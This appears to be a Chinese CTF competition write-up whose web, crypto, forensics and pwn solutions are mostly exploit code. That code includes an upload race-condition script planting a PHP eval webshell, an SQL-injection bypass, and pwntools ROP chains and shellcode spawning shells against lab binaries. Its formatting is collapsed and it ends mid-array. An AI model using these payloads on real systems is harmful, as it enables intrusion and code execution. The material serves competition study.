```shellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/e63ea739dcfe620a6da2d5743fca7aef.jpghttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/a9eb430817ca0ca62b44895f5235c0a2.phpshellphp文件允许上传，且判断方式为，先保存再判断文件是否符合要求，不符合要求再删除该文件： --绕过方式：条件竞争 --前提条件：需要明确文件夹及文件名的保存方式shell该文件夹是留给选手的提示，也属于信息泄露问题： 文件夹： 1、127.0.0.1：意为文件夹明文形式为ip地址形式 2、用户自己上传的文件保存文件夹位置为32位小写数据，隐性提示文件夹命名格式：md5(ip) 上传文件名： 1、127.0.0.11733883325：组成形式可以分为两部分-127.0.0.1：ip-1733883325：十位字符取整数部分的时间戳 2、用户自己上传的文件保存的文件名为32位小写数据，隐性提示文件夹命名格式：md5(ip+时间戳)pythonimport requestsimport hashlibimport time
# 设置目标网页的URL。需要修改IP地址与上传文件保存位置的文件夹名url = 'http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/'
# ipprefix_string = '192.168.16.43' # 这个ip为选手访问靶机的出口ip
# 使用一个while循环来保持请求，直到返回200响应while True:# 使用生成的MD5值作为文件名
def md5_encrypt(string): md5_obj = hashlib.md5()
 md5_obj.update(string.encode('utf-8'))
 md5_hash = md5_obj.hexdigest()
return md5_hash
# 获取当前时间戳并提取证书部分（只保留时间，去掉日期部分） timestamp = time.time() timestamp = int(timestamp)
# 拼接指定字符串和时间戳 raw_string = prefix_string + str(timestamp)
# 对拼接后的字符串进行MD5加密 md5_filename = md5_encrypt(raw_string)
# 发起GET请求 response = requests.get(url+md5_filename+'.php')
# 检查响应的状态码if response.status_code == 200: print(f'请求成功，访问的URL为: {response.url}')break # 停止请求elif response.status_code == 404: print(f'{response.url}: 页面未找到 (404)，继续请求...')else: print(f'{response.url}: 请求失败，状态码: {response.status_code}')break # 如果状态码不是404或200，终止请求php<?php fputs(fopen('2.php','w'),'<?php @eval($_REQUEST[a]);?>');?>shell> python b.py
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/331022e16a02f7645887db74512e28ca.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.php: 页面未找到 (404)，继续请求...请求成功，访问的URL为: http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/5eaf0e35d73fc709bbbd52d30f9eddee.phpshellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=phpinfo();shellhttp://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=print_r(scandir('/'));
http://192.168.18.32/admin/Uploads/5f5e82a45dfaabb7df5a1fe28632d10d/2.php?a=print_r(file_get_contents('/flag'));shell启动命令格式: python exp.py -rip 目标靶机IP -p 靶机服务端口 -lip 本地出口ip -cookie 已取得后台访问权限的cookie
eg: python exp.py -rip 192.168.18.32 -p 80 -lip 192.168.16.43 -cookie PHPSESSID=qi6nkhcmals15ljqbm3qaup8sp```

WEB

sqli or not

```传入a=123&a=456&a=789最终接收到的是a=[123,456,789]
a={"name":"admin"&a="pass":"123456"}最终接收到的是[ '{"name":"admin"', '"pass":"123456"}' ]
经过JSON.parse()则可以解析json得到{"name":"admin","pass":"123456"}$`var a ="abcd";a = a.replace("c","$`");?username=$` ||1%23&password=123select * from userinfo where username = 'select * from userinfo where username = ' ||1#' and password = '123456'?info={"username":"$` ||1%23"&info="password":"123456"}```

往期精选

八载磨剑西湖畔，网安群英问鼎时——第八届西湖论剑大赛今日正式启动报名

2024-12-20

热血青春，仗剑天涯！第八届西湖论剑网络安全技能大赛报名火热进行中！

2025-01-06

第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（上）

2025-01-23


```
```img1.img -> gSoNiXLC.imgimg2.img -> uGZ85OzT.imgimg3.img -> m8X4exzG.imgimg4.img -> Fsiq6lKn.imgimg5.img -> suPVGqm6.img ```
``` 30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b30203010001   ```
```pythonfrom Crypto.PublicKey import RSAimport binascii
# 将你的16进制字符串放在这里 hex_key = "30819e300d06092a864886f70d010101050003818c00308188028180525e1781f2f02d132a7818a6d269baddbf39352c8d20290ec2294fbe4d77e6549ef4766d8b0e1620000adfbd7aff99cd72f05623eb0def202265cf631dd895acd5e981da8424c03a295895c8194a31641f2eecd5a8715ca89cdbf9433c5d437538767666c3bdb0f8629555375b574fe408a94ae82f92960085d416374f1654b30203010001" # 用你的实际十六进制字符串替换
# 将十六进制字符串转换为字节 key_bytes = binascii.unhexlify(hex_key)
# 导入RSA公钥 rsa_key = RSA.import_key(key_bytes)
# 提取模数(n)和指数(e) n = rsa_key.n e = rsa_key.e
# 打印模数和指数 print(f"Modulus (n): {n}") print(f"Exponent (e): {e}")
# 将RSA公钥导出为PEM格式 pem_key = rsa_key.publickey().export_key(format='PEM')
# 打印PEM格式公钥 print(pem_key.decode('utf-8'))   ```
```pythonfrom cryptography.hazmat.primitives.asymmetric import rsafrom cryptography.hazmat.primitives import serializationfrom cryptography.hazmat.primitives.asymmetric.utils import ( encode_dss_signature, decode_dss_signature, )from cryptography.hazmat.backends import default_backendimport gmpy2
from sympy import nextprime, isprimeimport random

def generate_rsa_keys_from_components(p, q, n, e, d):""" 使用提供的 n, e, d 生成 RSA 密钥对 :
param n: 模数 (int) :
param e: 公钥指数 (int) :
param d: 私钥指数 (int) :
return: 公钥和私钥对象 """# 创建 RSA 密钥对象 private_key = rsa.RSAPrivateNumbers( p=p, q=q, d=d, dmp1=d % (p - 1), dmq1=d % (q - 1), iqmp=rsa.rsa_crt_iqmp(p, q), public_numbers=rsa.RSAPublicNumbers(e=e, n=n), ).private_key(backend=default_backend())
# 获取公钥 public_key = private_key.public_key()
return public_key, private_key

def save_keys_to_pem(public_key, private_key, public_path, private_path):""" 将公钥和私钥保存为 PEM 格式的文件 :
param public_key: 公钥对象 :
param private_key: 私钥对象 :
param public_path: 公钥文件路径 :
param private_path: 私钥文件路径 """# 序列化公钥为 PEM 格式 public_pem = public_key.public_bytes( encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo, )
# 序列化私钥为 PEM 格式 private_pem = private_key.private_bytes( encoding=serialization.Encoding.PEM, format=serialization.PrivateFormat.PKCS8, encryption_algorithm=serialization.NoEncryption(), )
# 保存公钥到文件with open(public_path, "wb") as f: f.write(public_pem)
# 保存私钥到文件with open(private_path, "wb") as f: f.write(private_pem)

def main(): p = 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026221 q = 7605291443685150594150190909345113655196508809219162555499789316232908573154196070425269090153291952292016936024761413150455793038505322748933150548026527 e = 0x10001 n = p * q phi = (p - 1) * (q - 1) d = gmpy2.invert(e, phi) print(d) d = int(d)
# 生成密钥对 public_key, private_key = generate_rsa_keys_from_components(p, q, n, e, d)
# 保存密钥到文件 save_keys_to_pem(public_key, private_key, "publicKey.pem", "privateKey.pem") print("公钥和私钥已成功生成并保存到文件中！")if __name__ == "__main__": main()   ```
```pythonimport hashlibfrom Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5import base64import hexdump PRIVATE_KEY = """-----BEGIN PRIVATE KEY----- MIICdAIBADANBgkqhkiG9w0BAQEFAASCAl4wggJaAgEAAoGAUl4XgfLwLRMqeBim 0mm63b85NSyNICkOwilPvk135lSe9HZtiw4WIAAK3716/5nNcvBWI+sN7yAiZc9j HdiVrNXpgdqEJMA6KViVyBlKMWQfLuzVqHFcqJzb+UM8XUN1OHZ2ZsO9sPhilVU3 W1dP5AipSugvkpYAhdQWN08WVLMCAwEAAQKBgClZWuu9jZzTNkq79WND+K9BQ/LR vrcaZXJLUuDx+vMCIBoRKcTY+XpvCwZvFMQj7eN5i4TUh1Y4B4yco+FjzR85KDCz q9KuLsJzGcxQQSfcAzDhhLAEhoEaR0ud/F+ltL+RRRv/Pv8DVJG02rWfiFliKecb Y2lS6I7VarAeo4ahAkEAkTXj5VW3w40YhnWoh/hyoCcCa2ic+HIM11hlALQiXE3P KLGj+WeVNzzRveNhQDjDwYZBBl5rvSinhFJ8glXjbQJBAJE14+VVt8ONGIZ1qIf4 cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RSfIJV 5J8CQHq8lC4p77NoNUyhcpvLEgfwMQlcWSFeNSBn5KddmpVuZyU8UR7jwKn5zEa2 RGMmF8AhnCCn+mTeUgl0Ny1rL1kCQCGUN64Jw2PqFdjKDn3a2w7j1nBmEZ52KTgH Ddw6y5NSvuvnIEcFSAEtBEeH9C44sjPnStQhM4LbitlThc1R9XsCQCKkR++Zd/hF okuUihZl79eQ1ekZyxgh5p51S/b3Gpo0BsDseESze3C7r4bRA/Vi4A82nbwU2h7n Zd8mFVZPDUM= -----END PRIVATE KEY-----"""
 encode_data = "SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k="
 private_key = RSA.import_key(PRIVATE_KEY.encode())
 cipher = PKCS1_v1_5.new(private_key) ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
if ciphertext[0:4] == b'x00x00xBExEF': raw_aes_keys = ciphertext[8:24]# print(raw_aes_keys) raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest() aes_key = raw_aes_hash256[0:16] hmac_key = raw_aes_hash256[16:]
 print("RAW key: {}".format(raw_aes_keys.hex())) print("AES key: {}".format(aes_key.hex())) print("HMAC key: {}".format(hmac_key.hex()))
 hexdump.hexdump(ciphertext)   ```
```pythonimport hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AES
 AES_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8") HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d") encrypt_data = "00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3"
def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key):# if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:# print("message authentication failed")
# return
 cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)return cipher.decrypt(encrypted_data)
 encrypt_data = bytes.fromhex(encrypt_data)

try: encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False) encrypt_data_l = encrypt_data[4:] data1 = encrypt_data_l[:
encrypt_data_length-16] signature = encrypt_data_l[encrypt_data_length-16:
encrypt_data_length] iv_bytes = b"abcdefghijklmnop" dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)
except: dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)
 print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False))) print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False))) print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False))) print(dec[12:
int.from_bytes(dec[4:8], byteorder='big', signed=False)]) print(hexdump.hexdump(dec))   ```
```pythonimport hmacimport binasciiimport base64import hexdumpfrom Crypto.Cipher import AES
 AES_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8") HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d") encrypt_data = "hex"
def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key): cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)return cipher.decrypt(encrypted_data)
 encrypt_data = bytes.fromhex(encrypt_data)

try: encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False) encrypt_data_l = encrypt_data[4:] data1 = encrypt_data_l[:
encrypt_data_length-16] signature = encrypt_data_l[encrypt_data_length-16:
encrypt_data_length] iv_bytes = b"abcdefghijklmnop" dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)
except: dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)
 print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False))) print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False))) print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
# print(dec[:
100].hex())
# print(dec[12:
int.from_bytes(dec[4:8], byteorder='big', signed=False)]) print(hexdump.hexdump(dec[:
1000])) open('secret.pcapng','wb').write(dec[64:-76])   ```
```cppextern "C" {int _LongSwap(int l) {unsigned int res = __builtin_bswap32(*(unsigned int *)&l);
return *(int *)&(res); }
const unsigned char mungify_table[] = {0x7A, 0x64, 0x05, 0xF1,0x1B, 0x9B, 0xA0, 0xB5,0xCA, 0xED, 0x61, 0x0D,0x4A, 0xDF, 0x8E, 0xC7};
const unsigned char mungify_table2[] = {0x05, 0x61, 0x7A, 0xED,0x1B, 0xCA, 0x0D, 0x9B,0x4A, 0xF1, 0x64, 0xC7,0xB5, 0x8E, 0xDF, 0xA0};
unsigned char mungify_table3[] = {0x20, 0x07, 0x13, 0x61,0x03, 0x45, 0x17, 0x72,0x0A, 0x2D, 0x48, 0x0C,0x4A, 0x12, 0xA9, 0xB5};
void COM_UnMunge2(unsigned char *data, int len, int seq){int i;
int mungelen;
int c;
int *pc;
unsigned char *p;
int j;
 mungelen = len & ~3; mungelen /= 4;
for (i = 0; i < mungelen; i++) { pc = (int *)&data[i * 4]; c = *pc; c ^= seq;
 p = (unsigned char *)&c;for (j = 0; j < 4; j++) { *p++ ^= (0xa5 | (j << j) | j | mungify_table2[(i + j) & 0x0f]); }
 c = _LongSwap(c); c ^= ~seq; *pc = c; } } } ```
 ``` g++ -shared -o dll.so dll.cpp    ```
```pythonfrom scapy.all import *from ctypes import *import struct
 lib=CDLL('./dll.so') COM_UnMunge=lib.COM_UnMunge2
 pcaps = rdpcap("secret.pcapng")
 f=open('res','wb')for mpacket in pcaps.filter(lambda x:
UDP in x and x[UDP].sport==27015):# mpacket.show() udp=mpacket[UDP] data=bytes(udp.payload)[8:] seq=bytes(udp.payload)[:4] ack=bytes(udp.payload)[4:8] c=create_string_buffer(data) COM_UnMunge(c,len(data),seq[0]) print(mpacket.time,mpacket[IP].src,'->',mpacket[IP].dst) decode_bytes=bytes(c)if len(decode_bytes)>10:if struct.unpack('<L', seq)[0] & (1<<30):if len(decode_bytes)>10+struct.unpack('<h', decode_bytes[7:9])[0]+1: print('find extra data block:') print(decode_bytes[10+struct.unpack('<h', decode_bytes[7:9])[0]:]) decode_bytes=decode_bytes[10:10+struct.unpack('<h', decode_bytes[7:9])[0]]# f.write(decode_bytes) print(f'finally decode data:{decode_bytes}nlength:{len(decode_bytes)}') f.close    ```
```text:
00000000001723F8 CC int 3 ; Trap to Debugger.text:
00000000001723F9 58 pop rax.text:
00000000001723FA 0B 00 or eax, [rax].text:
00000000001723FC E8 8F 61 EB FF call j_strncmp.text:
0000000000172401 85 C0 test eax, eax.text:
0000000000172403 0F 94 C0 setz al.text:
0000000000172406 EB 22 jmp short loc_17242A
.text:
000000000017242A loc_17242A: .text:
000000000017242A 48 83 C4 08 add rsp, 8.text:
000000000017242E C3 retn```
```python
from pwn import *
#p=process("./trace")p=remote("127.0.0.1",8888)#context.log_level="debug"#gdb.attach(p,"b *$rebase(0xb2b)")#"b *$rebase(0x14c6)"#raw_input()#libc=ELF("/home/ubuntu/glibc-all-in-one-new/libs/2.35-0ubuntu3.5_amd64/libc.so.6")
def show(idx): p.recvuntil(">") p.sendline(str(2)) p.recvuntil("?n") p.sendline(str(idx))
def set(idx,number,data): p.recvuntil(">") p.sendline(str(1)) p.recvuntil(":n") p.send(data) p.recvuntil("?n") p.sendline(str(idx)) p.recvuntil("?n") p.sendline(str(number))

def go(): p.recvuntil(">") p.sendline(str(3))
'''text:
00000000001723F8 CC int 3 ; Trap to Debugger.text:
00000000001723F9 58 pop rax.text:
00000000001723FA 0B 00 or eax, [rax].text:
00000000001723FC E8 8F 61 EB FF call j_strncmp.text:
0000000000172401 85 C0 test eax, eax.text:
0000000000172403 0F 94 C0 setz al.text:
0000000000172406 EB 22 jmp short loc_17242A
.text:
000000000017242A loc_17242A: .text:
000000000017242A 48 83 C4 08 add rsp, 8.text:
000000000017242E C3 retn
'''
puts_off=0x219098
show(-4)
p.recvuntil(" = ")stack=int(p.recvuntil("n",drop=True),10)-32print(hex(stack))
show(-2)p.recvuntil(" = ")
lib=int(p.recvuntil("n",drop=True),10)-0x21a6a0print(hex(lib))
gadget=lib+0x000001144e6 #0x00000000001144e6 : add rsp, 0x78 ; retint3=lib+0x1723F8rdi=lib+0x000000000002a3e5rsi=lib+0x000000000002be51rdx=lib+0x00000000000796a2rax=lib+0x0000000000045eb0op=lib+0x1142f0read=lib+0x1145e0write=lib+0x114680write_able=lib+2207552
rop_chain=p64(rdi)+p64(0)+p64(rsi)+p64(write_able)+p64(rdx)+p64(8)+p64(read)rop_chain+=p64(rdi)+p64(write_able)+p64(rsi)+p64(write_able)+p64(rdx)+p64(3)+p64(int3)+p64(stack+0x200)+p64(0xdeadbeef)rop_chain+=p64(rdi)+p64(write_able)+p64(rsi)+p64(0)+p64(rdx)+p64(0)+p64(op)rop_chain+=p64(rdi)+p64(3)+p64(rsi)+p64(write_able+0x8)+p64(rdx)+p64(0x40)+p64(read)rop_chain+=p64(rdi)+p64(1)+p64(rsi)+p64(write_able+0x8)+p64(rdx)+p64(0x40)+p64(write)
idx=-((stack-(lib+puts_off))/8)set(idx,gadget,"a"*0x10+rop_chain)
raw_input()p.send("/flagx00")
p.interactive()
```
```python3import pwnlibimport os
from pwn import *
p = process("./task")elf = ELF("./task")#p = remote("ip",port)p.recvuntil('puchid: ')child_pid = int(p.recvline().strip())success("pid: " + str(child_pid))

context.arch = 'i386'context.bits = 32sc32 = shellcraft.i386.linux.open("/proc/{}/mem".format(child_pid), 1)sc_start = """ push 0x23 mov rax,{} push rax retfq mov rsp,0x10500""".format(hex(0x10000+0xc))

sc32= asm(sc_start,arch="amd64",bits=64) + asm(sc32)
context.arch = "amd64"context.bits = 64

sc_mid = """ push 0x33 push {} retfq""".format(hex(0x10000 +len(sc32)+9))

shellcode1 = shellcraft.amd64.sh()sc2 = b"x90"*50 + asm(shellcode1)
sc64 = shellcraft.amd64.syscall('SYS_lseek', 3, elf.symbols['made_in_heaven'], 0)sc64 += shellcraft.amd64.pushstr(sc2)sc64 += shellcraft.amd64.write(3, 'rsp', len(sc2))

sc_combined = sc32 + asm(sc_mid) + asm(sc64)

#gdb.attach(p)

p.send(sc_combined)
p.interactive()
```
```for i in range(7): add(100)
show()```
```edit(18, pop_rdi&0xffffffff)edit(19, (pop_rdi>>32)&0xffff)edit(20, bin_sh&0xffffffff)edit(21, (bin_sh>>32)&0xffff)edit(22, (pop_rdi+1)&0xffffffff)edit(23, ((pop_rdi+1)>>32)&0xffff)edit(24, system&0xffffffff)edit(25, (system>>32)&0xffff)```
```from pwn import *import ctypes
p = process("./pwn")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")def menu(idx): p.sendlineafter("Enter your choice: ", str(idx))
def add(data): menu(2) p.sendlineafter("Enter the value to push:", str(data))
def show(): menu(4)
def edit(idx, data): menu(1) p.sendlineafter("Enter the index to edit (0-based): ",str(idx)) p.sendlineafter("Enter the new value: ", str(data))

for i in range(7): add(100)
show()pause()p.recvuntil("StackVector contents: ")data_list = p.recvuntil("n")data_list = data_list.split(b' ')low_data = int(data_list[18])unsigned_number = ctypes.c_uint32(low_data).valueprint(hex(unsigned_number))print(hex(int(data_list[19])))libc_addr_high = int(data_list[19])<<32print(hex(libc_addr_high))libcase = libc_addr_high + unsigned_number -0x29d90print(hex(libcase))system = libcase + libc.sym['system']bin_sh = libcase + next(libc.search(b"/bin/sh"))context.arch = 'amd64'pop_rdi = libcase + next(libc.search(asm("pop rdi;ret")))ret = libcase + next(libc.search(asm("ret")))one = libcase + 0xebd43
# gdb.attach(p, 'b *$rebase(0x1751)')edit(18, pop_rdi&0xffffffff)edit(19, (pop_rdi>>32)&0xffff)edit(20, bin_sh&0xffffffff)edit(21, (bin_sh>>32)&0xffff)edit(22, (pop_rdi+1)&0xffffffff)edit(23, ((pop_rdi+1)>>32)&0xffff)edit(24, system&0xffffffff)edit(25, (system>>32)&0xffff)menu(5)
# show()p.interactive()```
```python#-*- coding=utf-8 -*-from pwn import *from sys import argv
s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
u32(data.ljust(4,' '))uu64 = lambda data :
u64(data.ljust(8,' '))leak = lambda name,addr :
log.success('{} = {:#x}'.format(name, addr))
def dbg(a=''): gdb.attach(sh, a) pause()
binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
    #context.log_level = 'DEBUG'#context.arch = 'amd64'
def pwn(addr, debug):
global shglobal libc
 libc = elf.libc#libc = ELF(libc_path)

 i = 1while True:if(debug == 1): sh = process(binary)#sh = process(binary,env={"LD_PRELOAD" : libc_path})else: ip = addr.split(':')[0] port = addr.split(':')[1] sh = remote(ip, port)
 ru('Welcome to dance: ') sl('a'*i) data = rl()if data.startswith('Wrong length'): sh.close() i += 1continue print('flag length: ' + str(i))break
if __name__ == "__main__": pwn('localhost:
9999', 0)```
```python#-*- coding=utf-8 -*-from pwn import *from sys import argvimport re
s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
u32(data.ljust(4,' '))uu64 = lambda data :
u64(data.ljust(8,' '))leak = lambda name,addr :
log.success('{} = {:#x}'.format(name, addr))
def dbg(a=''): gdb.attach(sh, a) pause()
binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
context.log_level = 'DEBUG'#context.arch = 'amd64'
def pwn(addr, debug):
global shglobal libc
 libc = elf.libc#libc = ELF(libc_path)
if(debug == 1): sh = process(binary)#sh = process(binary,env={"LD_PRELOAD" : libc_path})else: ip = addr.split(':')[0] port = addr.split(':')[1] sh = remote(ip, port)
 pd = 'a' * 96 sla('Welcome to dance: ', pd)
 ru('Start from 0n') rl()
 index_list = [0]
for i in range(96*8-1): data = rl()
# 匹配目标字符串，其中 {} 内匹配 x30 或 x31 pattern = r'x1bx5bx30x6dx1bx5bx30x3bx33x31x6d(x30|x31)x1bx5bx30x6dx1bx5bx30x3bx33x32x6d'
# 使用 re.search 查找第一个匹配结果 match = re.search(pattern, data)
 index_list.append(match.end() - 30) #前面还有一个这样的标志，所以要减30
 print(index_list) print(list(reversed(index_list)))
if __name__ == "__main__": pwn('localhost:
9999', 0)```
```python#include <stdio.h>#include <stdlib.h>#include <string.h>
unsigned int FindBitSrc(unsigned int* box, unsigned int dwBitIdx, unsigned int dwBitNum){for (int i = 0; i < dwBitNum; i++) {if (box[i] == dwBitIdx) {return i; } }
return -1;}
unsigned int BitDecode(unsigned char* cipher, unsigned int* box, unsigned int count){unsigned char srcBit = cipher[0] >> 7;
unsigned int idx = 0;
unsigned int dwBitNum = count;
unsigned int dwBitSrcIdx;
unsigned char destBit;
unsigned int index = 0;
while (count--) { dwBitSrcIdx = box[index];
 destBit = (cipher[dwBitSrcIdx >> 3] >> (7 - (dwBitSrcIdx & 7))) & 1; cipher[dwBitSrcIdx >> 3] ^= (srcBit ^ destBit) << (7 - (dwBitSrcIdx & 7));
 srcBit = destBit; idx = dwBitSrcIdx; index++; }
return 0;}
unsigned int BitDanceDecode(unsigned char* cipher, unsigned int len){unsigned int box[] = {223, 64, 650, 471, 493, 580, 763, 459, 754, 349, 393, 417, 643, 638, 208, 324, 690, 490, 747, 200, 505, 256, 124, 670, 651, 550, 392, 517, 129, 526, 35, 388, 183, 654, 109, 318, 137, 585, 492, 117, 750, 507, 164, 622, 101, 358, 535, 661, 662, 78, 41, 378, 628, 410, 449, 533, 593, 222, 491, 38, 709, 462, 83, 230, 644, 627, 468, 80, 724, 295, 4, 435, 5, 383, 444, 341, 692, 411, 678, 360, 679, 277, 49, 57, 688, 649, 463, 337, 167, 123, 142, 55, 558, 397, 472, 700, 683, 115, 376, 728, 268, 245, 689, 332, 361, 731, 20, 429, 619, 286, 287, 641, 107, 63, 209, 46, 477, 74, 635, 21, 529, 257, 356, 723, 17, 516, 671, 316, 19, 419, 215, 86, 749, 193, 498, 118, 740, 347, 217, 292, 655, 482, 695, 501, 431, 368, 401, 424, 713, 466, 82, 25, 264, 598, 161, 694, 147, 340, 283, 185, 254, 13, 736, 297, 733, 766, 56, 367, 592, 510, 422, 568, 571, 666, 602, 727, 645, 84, 111, 203, 110, 584, 436, 575, 155, 192, 518, 597, 335, 454, 450, 37, 583, 158, 664, 399, 165, 307, 76, 537, 114, 624, 170, 206, 687, 169, 385, 483, 703, 681, 426, 730, 120, 456, 621, 36, 272, 717, 357, 718, 22, 54, 255, 497, 274, 59, 536, 320, 726, 389, 514, 339, 460, 108, 534, 660, 69, 190, 626, 379, 140, 181, 131, 240, 288, 448, 77, 24, 39, 113, 187, 322, 216, 734, 42, 104, 153, 278, 433, 353, 373, 636, 502, 423, 374, 317, 87, 567, 485, 72, 540, 415, 443, 1, 605, 201, 407, 427, 390, 210, 179, 314, 188, 425, 156, 486, 746, 244, 476, 219, 710, 211, 488, 499, 149, 202, 523, 2, 696, 414, 442, 184, 737, 432, 196, 338, 565, 520, 711, 595, 398, 359, 364, 102, 406, 45, 65, 685, 73, 509, 637, 365, 313, 235, 296, 721, 134, 569, 128, 416, 760, 126, 98, 263, 51, 599, 452, 693, 348, 508, 241, 34, 362, 145, 538, 180, 659, 458, 47, 676, 352, 218, 282, 566, 79, 309, 639, 386, 127, 12, 27, 609, 603, 663, 163, 691, 233, 294, 586, 207, 581, 139, 741, 589, 494, 512, 159, 612, 402, 682, 441, 577, 739, 310, 10, 531, 591, 464, 674, 116, 665, 75, 608, 157, 267, 743, 412, 269, 298, 675, 729, 105, 265, 720, 371, 579, 545, 70, 9, 553, 576, 121, 377, 32, 631, 504, 52, 705, 154, 606, 604, 408, 753, 594, 224, 252, 279, 434, 745, 582, 440, 150, 258, 351, 614, 647, 33, 646, 94, 561, 611, 62, 765, 198, 618, 633, 273, 400, 58, 302, 735, 457, 455, 290, 319, 451, 85, 204, 31, 308, 413, 89, 744, 11, 613, 698, 166, 229, 23, 350, 742, 640, 330, 336, 546, 122, 395, 652, 541, 634, 667, 372, 119, 311, 475, 758, 238, 447, 151, 532, 714, 304, 552, 418, 405, 106, 93, 600, 625, 18, 465, 276, 680, 409, 321, 446, 289, 195, 630, 213, 403, 53, 615, 40, 363, 716, 91, 381, 587, 135, 617, 461, 176, 271, 521, 547, 60, 543, 554, 327, 588, 559, 66, 160, 556, 328, 764, 601, 92, 16, 334, 236, 668, 738, 186, 684, 346, 141, 610, 205, 515, 